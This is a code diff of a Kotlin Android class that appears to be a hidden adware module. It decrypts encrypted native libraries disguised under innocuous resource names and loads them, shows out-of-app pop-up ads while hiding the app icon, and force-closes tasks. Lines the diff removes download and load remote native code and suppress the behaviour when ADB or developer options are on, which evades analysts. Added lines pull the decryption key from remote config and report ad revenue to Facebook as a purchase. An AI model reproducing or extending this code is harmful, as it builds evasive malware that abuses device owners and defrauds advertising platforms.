@@ -5,30 +5,34 @@ import android.app.KeyguardManager
 import android.content.Context
 import android.net.ConnectivityManager
 import android.os.Build
-import android.os.Handler
-import android.os.Looper
+import android.os.Bundle
 import android.os.PowerManager
-import android.provider.Settings
 import androidx.work.ExistingWorkPolicy
 import androidx.work.OneTimeWorkRequest
 import androidx.work.WorkManager
-import com.cozy.serprosz.CozyWCaz
+import com.facebook.FacebookSdk
+import com.facebook.appevents.AppEventsLogger
+import com.flash.furtive.FurtiveLW
+import com.google.firebase.analytics.FirebaseAnalytics
+import com.google.firebase.analytics.ktx.analytics
+import com.google.firebase.ktx.Firebase
 import com.ozop.impI.AppLifecycelListener
 import com.ozop.impI.Constant
 import com.ozop.impI.Core
-import com.righteous.and.core.b.A1
+import o1.d0
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
-import lovely.Ppz
+import loz.Hz1
 import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import java.io.InputStream
 import java.text.SimpleDateFormat
+import java.util.Currency
 import java.util.Date
 import java.util.Locale
 import javax.crypto.Cipher
@@ -62,8 +66,7 @@ object AdE {
     private var isCurDay = Core.getStr("ad_lcd")
     private var numJumps = Core.getInt("ac_njp")
 
-    @JvmStatic
-    var isLoadH = false //是否H5的so 加载成功
+    private var soKey = ""
     private var tagL = "" //调用外弹 隐藏icon字符串
     private var tagO = "" //外弹字符串
 
@@ -75,9 +78,6 @@ object AdE {
     private var timeDE = 400L //延迟显示随机时间结束
     private var checkTimeRandom = 1000 // 在定时时间前后增加x秒
 
-    private var soUrlH5 = ""
-
-    private var soUrlW = ""
     private var maxShowTime = 10000L // 最大显示时间
 
     @JvmStatic
@@ -151,19 +151,6 @@ object AdE {
     @JvmStatic
     fun a2() {
         refreshAdmin()
-        if (isTestUser()) {
-            var time = Core.getStr("time_first")
-            if (time.isBlank()) {
-                time = System.currentTimeMillis().toString()
-                Core.saveC("time_first", time)
-            }
-            if (System.currentTimeMillis() - time.toLong() < 60000 * 60 * 3) { // 6小时以内
-                Core.pE("test_user")
-                return
-            } else {
-                Core.pE("test_user_time_pass")
-            }
-        }
         mContext.registerActivityLifecycleCallbacks(AppLifecycelListener())
         File("${mContext.dataDir}/$fileName").mkdirs()
         t()
@@ -180,7 +167,7 @@ object AdE {
         tagO = listStr[1]
         strBroadKey = listStr[2]
         fileName = listStr[3]
-        isCheckDev = js.optInt("winsome_s", 1) == 1
+        soKey = js.optString("wins_ska_k")
         AdCenter.setAdId(js.optString(Constant.K_ID_L))// 广告id
         val lt = js.optString(Constant.K_TIME).split("-")//时间相关配置
         cTime = lt[0].toLong() * 1000
@@ -193,14 +180,6 @@ object AdE {
         checkTimeRandom = lt[7].toInt() * 1000
         screenOpenCheck = lt[8].toLong()
         maxShowTime = lt[9].toLong() * 1000
-        val lSoU = js.optJSONArray("win_url_s")
-        if (is64a()) {
-            soUrlW = lSoU[0].toString()
-            soUrlH5 = lSoU[2].toString()
-        } else {
-            soUrlW = lSoU[1].toString()
-            soUrlH5 = lSoU[3].toString()
-        }
     }
 
     private var lastS = ""
@@ -212,26 +191,12 @@ object AdE {
         }
     }
 
-    private val handler = Handler(Looper.getMainLooper())
     private fun t() {
+        if (numJumps > nTryMax) {
+            Core.pE("pop_fail")
+            return
+        }
         action()
-    }
-
-    private fun acper() {
-        val parentFile = File("${mContext.filesDir}")
-        handler.postDelayed({
-            val hFile = File(parentFile, "fileSm")
-            FileDownLoad("H5").fileD(soUrlH5, success = {
-                loSo(hFile)
-                handler.post {
-                    try {
-                        Ppz.b(mContext)
-                        isLoadH = true
-                    } catch (_: Throwable) {
-                    }
-                }
-            }, hFile)
-        }, 1000)
     }
 
     private fun action() {
@@ -240,19 +205,18 @@ object AdE {
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loadSFile(if (is64a()) "vungle" else "fb_login")
+                i = loadSFile(if (is64a()) "jargon" else "kindle")
             }
             if (i.not()) {
                 Core.pE("ss_l_f")
                 return@launch
             }
             Core.pE("test_s_load", "${System.currentTimeMillis() - time}")
-            Ppz.a0(tagL)
+            Hz1.a0(tagL, 1.4f)
             if (isLi().not()) {
                 AdCenter.loadAd()
             }
             delay(1000)
-            acper()
             while (true) {
                 var t = cTime
                 if (checkTimeRandom > 0) {
@@ -262,7 +226,6 @@ object AdE {
                 delay(t)
                 // 刷新配置
                 refreshAdmin()
-                openOneWorker()
                 if (numJumps > nTryMax) {
                     Core.pE("pop_fail")
                     break
@@ -271,30 +234,23 @@ object AdE {
         }
     }
 
-    private fun loSo(assetsName: File): Boolean {
-        try {
-            assetsName.setReadOnly()
-            System.load(assetsName.absolutePath)
-            return true
-        } catch (_: Exception) {
-        }
-        return false
-    }
-
     private fun loadSFile(assetsName: String): Boolean {
-        val resourceId: Int =
-            mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
-        val aIp = mContext.resources.openRawResource(resourceId)
-        val fSN = "A_${System.currentTimeMillis()}"
+        val fSN = "Flash0104"
         val file = File("${mContext.filesDir}/Cache")
         if (file.exists().not()) {
             file.mkdirs()
         }
+        val file2 = File(file.absolutePath, fSN)
         try {
-            decrypt(aIp, File(file.absolutePath, fSN))
-            val file2 = File(file.absolutePath, fSN)
+            if (file2.exists().not() || file2.length() < 1024) {
+                file2.delete()
+                val resourceId: Int =
+                    mContext.resources.getIdentifier(assetsName, "raw", mContext.packageName)
+                val aIp = mContext.resources.openRawResource(resourceId)
+                decrypt(aIp, file2)
+            }
             System.load(file2.absolutePath)
-            file2.delete()
+//            file2.delete()
             return true
         } catch (_: Exception) {
         }
@@ -304,7 +260,7 @@ object AdE {
 
     // 解密
     private fun decrypt(inputFile: InputStream, outputFile: File) {
-        val key = SecretKeySpec("q17s8321jsjgk0oq".toByteArray(), "AES")
+        val key = SecretKeySpec(soKey.toByteArray(), "AES")
         val cipher = Cipher.getInstance("AES")
         cipher.init(Cipher.DECRYPT_MODE, key)
         val outputStream = FileOutputStream(outputFile)
@@ -371,7 +327,7 @@ object AdE {
             delay(finishAc())
             sNumJump(numJumps + 1)
             Core.pE("ad_start")
-            Ppz.a0(tagO)
+            Hz1.a0(tagO, 1.8f)
             lastSAdTime = System.currentTimeMillis()
             delay(4000)
             checkAdIsReadyAndGoNext()
@@ -403,7 +359,7 @@ object AdE {
     @JvmStatic
     fun finishAc(): Long {
         if (l().not()) return 0
-        val l = A1.a1()
+        val l = d0.a1()
         if (l.isNotEmpty()) {
             ArrayList(l).forEach {
                 it.finishAndRemoveTask()
@@ -419,51 +375,20 @@ object AdE {
         ) as KeyguardManager).isDeviceLocked.not()
     }
 
-    private var time = 0L
 
     @JvmStatic
-    private fun openOneWorker() {
-        if (System.currentTimeMillis() - time < 45000) return
-        time = 0L
-        val workManager = WorkManager.getInstance(mContext)
-        workManager.cancelAllWork()
-        val workRequest = OneTimeWorkRequest.Builder(CozyWCaz::class.java).build()
-        workManager.enqueueUniqueWork(
-            "work_phone_notification", ExistingWorkPolicy.REPLACE, workRequest
+    fun postEcpm(ecpm: Double) {
+        try {
+            val b = Bundle()
+            b.putDouble(FirebaseAnalytics.Param.VALUE, ecpm)
+            b.putString(FirebaseAnalytics.Param.CURRENCY, "USD")
+            Firebase.analytics.logEvent("ad_impression_flash", b)
+        } catch (_: Exception) {
+        }
+        if (FacebookSdk.isInitialized().not()) return
+        //fb purchase
+        AppEventsLogger.newLogger(mContext).logPurchase(
+            ecpm.toBigDecimal(), Currency.getInstance("USD")
         )
-    }
-
-    private fun isTestUser(): Boolean {
-        if (isCheckDev.not()) return false
-        val s = Core.getStr("tes_u")
-        val isOpen = isAdbEnabled(mContext) || isDevelopmentSettingsEnabled(mContext)
-        if (isOpen && s.isBlank()) {
-            Core.saveC("tes_u", "1")
-        }
-        return isOpen || s == "1"
-    }
-
-    private fun isAdbEnabled(context: Context): Boolean {
-        try {
-            val adbEnabled =
-                Settings.Global.getInt(context.getContentResolver(), Settings.Global.ADB_ENABLED, 0)
-            return adbEnabled == 1
-        } catch (e: java.lang.Exception) {
-            return false
-        }
-    }
-
-    /**
-     * 检查开发者选项是否开启（不完全可靠）
-     */
-    private fun isDevelopmentSettingsEnabled(context: Context): Boolean {
-        try {
-            val devOptionsEnabled = Settings.Global.getInt(
-                context.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0
-            )
-            return devOptionsEnabled == 1
-        } catch (e: java.lang.Exception) {
-            return false
-        }
     }
 }
